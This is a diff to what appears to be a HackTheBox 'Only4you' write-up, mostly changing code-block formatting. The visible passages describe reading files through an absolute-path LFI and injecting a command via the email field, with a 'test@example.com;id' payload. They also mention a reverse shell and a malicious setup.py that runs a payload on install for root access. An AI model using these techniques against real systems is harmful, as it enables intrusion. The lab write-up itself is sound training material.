@@ -148,7 +148,8 @@ drwxr-xr-x    - kali  1 Nov  2022 uploads
 
 The download route can potentially be used to read files using the `image` parameter. Although path traversal won't succeed because of input sanitization, the filters can be bypassed with an absolute path due to the presence of `os.path.join`.
 
-```bash
+{{< highlight bash "hl_lines=5 9" >}}
+
 @app.route('/download', methods=['POST'])
 def download():
     image = request.form['image']
@@ -165,7 +166,8 @@ def download():
     except (TypeError, ValueError):
         raise BadRequest()
     return send_file(filename, as_attachment=True)
-```
+
+{{< /highlight >}}
 
 As suspected, its vulnerable to LFI with an absolute path. Querying `/etc/hostname` returns `only4you`.
 
@@ -222,7 +224,8 @@ Given this information, it seems that the root directory for the `only4you.htb` 
 
 _/var/www/only4you.htb/app.py_
 
-```python
+{{< highlight python "hl_lines=2 12 17" >}}
+
 > http --form -pb POST beta.only4you.htb/download image='/var/www/only4you.htb/app.py'
 from flask import Flask, render_template, request, flash, redirect
 from form import sendmessage
@@ -268,11 +271,13 @@ def method_not_allowed(error):
 
 if __name__ == '__main__':
     app.run(host='127.0.0.1', port=80, debug=False)
-```
+
+{{< /highlight >}}
 
 The module imports the `sendmessage()` function from then form module. So retrieved the `form.py` file using LFI vulnerability.
 
-```python
+{{< highlight python "linenos=table,hl_lines=8 11-12 16-17" >}}
+
 > http --form -pb POST beta.only4you.htb/download image='/var/www/only4you.htb/form.py'
 import smtplib, re
 from email.message import EmailMessage
@@ -298,7 +303,8 @@ def sendmessage(email, subject, message, ip):
         msg['Message'] = f'{message}'
 ...snip...
 ...snip...
-```
+
+{{< /highlight >}}
 
 The `sendmessage()` function calls the `issecure()` function and provides it with the `email` parameter. Inside `issecure()`, the `email` is compared against a regular expression. If the condition is satisfied, the portion of the email after the `@` symbol is extracted. This extracted part is then utilized to execute the `dig` command using the subprocess library. Interestingly, the absence of an end anchor, `$`, in the regex pattern implies that if the pattern is located within a longer string, it will still be regarded as a match. For instance, with the payload `test@example.com;id`, the regex condition is fulfilled by `test@example.com`. Additionally the semicolon `;` in the payload trigger the execution of the `id` command when the `dig` command is run via subprocess.
 
@@ -335,7 +341,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 
 ```
 
-Leveraged the same vulnerability, used a reverse shell payload to get a shell as `www-data`
+Leveraged the same vulnerability and used a reverse shell payload to get a shell as `www-data`
 
 ```bash
 > http --form -pb POST only4you.htb \
@@ -564,7 +570,8 @@ Creating a python package with this structure
     -   **RunCommand()**: This function will contain the actual payload
     -   **RunEggInfoCommand()**: This will execute the payload by using `cmdclass={"install": RunInstallCommand, "egg_info": RunEggInfoCommand}`
 
-```bash
+{{< highlight python "hl_lines=12-13 33" >}}
+
 > cat src/main.py
 print("Root privilege escalation")
 
@@ -599,7 +606,8 @@ setup(
     packages=find_packages(),
     cmdclass={"install": RunInstallCommand, "egg_info": RunEggInfoCommand},
 )
-```
+
+{{< /highlight >}}
 
 Installing required modules in a virtual environment to build the package.
 
